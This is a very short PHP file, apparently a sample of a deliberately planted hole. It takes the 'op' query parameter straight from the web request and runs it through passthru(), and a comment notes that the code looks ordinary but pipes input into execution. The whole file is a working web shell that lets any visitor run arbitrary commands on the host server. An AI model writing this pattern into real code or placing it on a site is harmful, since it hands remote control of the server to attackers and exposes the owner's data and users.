<?php
// looks ordinary, but flows request input straight into exec
$op = $_GET['op'];
passthru($op);
